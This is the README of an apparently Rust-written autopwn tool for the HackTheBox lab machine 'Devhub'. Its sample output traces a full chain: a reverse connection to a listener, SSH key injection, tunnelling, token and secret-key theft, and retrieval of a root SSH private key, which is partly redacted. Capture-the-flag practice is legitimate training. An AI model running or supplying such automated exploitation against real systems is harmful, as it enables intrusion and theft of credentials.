# devhub_auto

> A simple autopwner for HTB: Devhub written in Rust

See more at [0xw1ld.github.io](https://0xw1ld.github.io/htb/2026/10/10/devhub.html)

### Sample Output
```
[Listener] Listening on: 10.10.14.3:35839
[Foothold Module]
[Foothold] Sending MCP Api Payload using: 10.10.14.3:35839...
[Listener] Connection from: 10.129.245.216:42280
[User Module]
[User] Injecting SSH key...
[User] ssh key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILBDBVrYhlJftOGhJsHfRx3AIpGAk42ptIEuojDG9X15 kali@kali
[User] Starting SSH tunnel...
[User] Tunnel up
[User] Grabbing Token...
[User] token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
[User] Grabing Terminal...
[User] Terminal: 31
[User] Getting user flag...
[ws] Terminal websocket initialized...
[User] flag: [REDACTED]
[Root Module]
[Root] Getting opsmcp key...
[ws] Terminal websocket initialized...
[Root] key: opsmcp_secret_key_4f5a6b7c8d9e0f1a
[Root] Starting SSH tunnel...
[Root] Tunnel up
[Root] Sending API payload to get SSH key...
[Root] SSH key: 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
[REDACTED]
-----END OPENSSH PRIVATE KEY-----

[Root] Getting root flag...
[Root] flag: [REDACTED]
```
